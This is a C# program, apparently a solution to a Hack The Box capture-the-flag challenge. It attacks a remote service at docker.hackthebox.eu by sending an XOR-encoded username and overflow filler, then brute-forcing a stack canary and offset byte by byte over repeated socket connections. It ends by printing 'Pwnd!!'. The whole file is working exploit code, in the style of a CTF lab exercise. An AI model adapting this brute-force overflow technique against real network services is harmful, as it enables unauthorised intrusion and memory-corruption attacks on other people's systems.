using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;

namespace dSocket
{
    class Program
    {
        private static Socket ConnectSocket(string Host, int Port)
        {
            IPHostEntry ipHostInfo = Dns.GetHostEntry(Host);
            IPAddress ipAddress = ipHostInfo.AddressList[0];            
            // IPAddress ipAddress = IPAddress.Parse(Host); 
            IPEndPoint ipe = new IPEndPoint(ipAddress, Port);

            Socket mySock = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            try
            {
                mySock.Connect(ipe);
            }
            catch (ArgumentNullException ane)
            {
                Console.WriteLine("ArgumentNullException : {0}", ane.ToString());
            }
            catch (SocketException se)
            {
                Console.WriteLine("SocketException : {0}", se.ToString());
            }
            catch (Exception e)
            {
                Console.WriteLine("Unexpected exception : {0}", e.ToString());
            }
            return mySock;
        }
        private static byte[] xorMe(byte[] inputBuffer)
        {
            byte[] returnBuffer = new byte[inputBuffer.Length];
            for (int i = 0; i < inputBuffer.Length; i++)
            {
                returnBuffer[i] = (byte)(inputBuffer[i] ^ 0x0d);
            }
            return returnBuffer;
        }
        private static byte[] getCanaryAndOffset(byte[] inputBuffer)
        {            
            byte[] stubXOR;
            int totalFound = 0;
            byte[] bytes = new byte[1024];            

            while (totalFound < 16)
            {
                byte[] returnBuffer = new byte[inputBuffer.Length + 1];
                for (int h = 0x00; h <= 0xff; h += 0x01)
                {
                    // add new byte to array                    
                    stubXOR = new byte[] { (byte)(h ^ 0x0d) };
                    List<byte> list1 = new List<byte>(inputBuffer);
                    List<byte> list2 = new List<byte>(xorMe(stubXOR));
                    list1.AddRange(list2);
                    returnBuffer = list1.ToArray();

                    // test new byte
                    Socket testSocket = ConnectSocket("docker.hackthebox.eu", 45661);
                    int bytesRec = testSocket.Receive(bytes);
                    testSocket.Send(returnBuffer);
                    bytesRec = 0;
                    Array.Clear(bytes, 0, bytes.Length);
                    bytesRec = testSocket.Receive(bytes);
                    testSocket.Close();                    

                    if (bytesRec > 0)
                    {                        
                        inputBuffer = returnBuffer;                        
                        totalFound++;
                        if (inputBuffer.Length == 1033)
                        {
                            Console.Write("[+] Success! Added ");
                        }
                        if (inputBuffer.Length > 1032)
                        {
                            Console.Write("{0}", h.ToString("x2"));
                        }
                        break;
                    }
                }
            }
            
            return inputBuffer;
        }
        private static byte[] getPayload()
        {
            byte[] bytes = new byte[1024];
            byte[] correctUser = new byte[] { 0x64, 0x61, 0x76, 0x69, 0x64, 0x65, 0x0d, 0x78 };
            byte[] filler = new byte[1024];
            for (int i = 0; i < filler.Length; i++)
            {
                filler[i] = 0x41;
            }
            byte[] toReturn = new byte[correctUser.Length + filler.Length];
            Buffer.BlockCopy(correctUser, 0, toReturn, 0, correctUser.Length);
            Buffer.BlockCopy(filler, 0, toReturn, correctUser.Length, filler.Length);

            toReturn = getCanaryAndOffset(toReturn);            

            return toReturn;
        }        
        private static void _end(Socket mySocket)
        {
            byte[] bytes = new byte[1024];
            int bytesRec2 = mySocket.Receive(bytes);
            mySocket.Close();
            if (bytesRec2 > 0)
            {
                Console.Write(" - payload + canary + offset VERIFIED!!\n");
            }
            Console.WriteLine("[+] Pwnd!!  Hit ENTER to exit.");
            Console.ReadKey();
        }
        private static void _pwn()
        {
            Console.WriteLine("[~] Let's rage!!\n[*] Beginning brute force");

            byte[] bytes = new byte[1024];

            // get payload
            byte[] myPayload = getPayload();
            if (myPayload.Length > 0)
            {
                Console.WriteLine("\n[+] Payload generated");
            }

            // connect
            Socket mySocket = ConnectSocket("docker.hackthebox.eu", 45661);
            int bytesRec3 = mySocket.Receive(bytes);
            if (bytesRec3 > 0)
            {
                Console.WriteLine("[+] Connected");
            }

            // send it
            mySocket.Send(myPayload);
            Console.Write("[+] Payload sent");

            // profit
            _end(mySocket);
        }

        private static void Main(string[] args)
        {
            _pwn();
        }
    }
}
